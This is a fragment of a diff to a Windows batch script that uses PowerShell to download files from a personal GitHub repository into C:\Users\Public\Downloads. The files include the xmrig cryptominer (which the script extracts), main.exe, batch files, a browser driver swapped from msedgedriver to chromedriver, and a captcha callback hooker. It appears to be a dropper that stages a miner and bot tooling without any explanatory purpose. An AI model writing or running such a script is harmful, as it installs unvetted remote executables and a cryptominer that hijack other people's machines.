@@ -2,7 +2,7 @@ powershell Invoke-WebRequest -Uri "https://github.com/xmrig/xmrig/releases/downl
 powershell Expand-Archive -LiteralPath C:\Users\Public\Downloads\xmrig.zip -DestinationPath C:\Users\Public\Downloads
 powershell Invoke-WebRequest -Uri "https://raw.githubusercontent.com/marinabarros320168/new/main/restartado.sh" -OutFile "C:\Users\Public\Downloads\xmrig-6.18.1\vai.cmd"
 cls
-powershell Invoke-WebRequest -Uri "https://raw.githubusercontent.com/marinabarros320168/new/main/msedgedriver.exe" -OutFile "C:\Users\Public\Downloads\msedgedriver.exe";
+powershell Invoke-WebRequest -Uri "https://raw.githubusercontent.com/marinabarros320168/new/main/chromedriver.exe" -OutFile "C:\Users\Public\Downloads\chromedriver.exe";
 powershell Invoke-WebRequest -Uri "https://raw.githubusercontent.com/marinabarros320168/new/main/vaiMain.bat" -OutFile "C:\Users\Public\Downloads\vaiMain.bat";
 powershell Invoke-WebRequest -Uri "https://raw.githubusercontent.com/marinabarros320168/new/main/main.exe" -OutFile "C:\Users\Public\Downloads\main.exe";
 powershell Invoke-WebRequest -Uri "https://raw.githubusercontent.com/marinabarros320168/new/main/AnyCaptchaCallbackHooker_Unpacked.zip" -OutFile "C:\Users\Public\Downloads\AnyCaptchaCallbackHooker_Unpacked.zip";
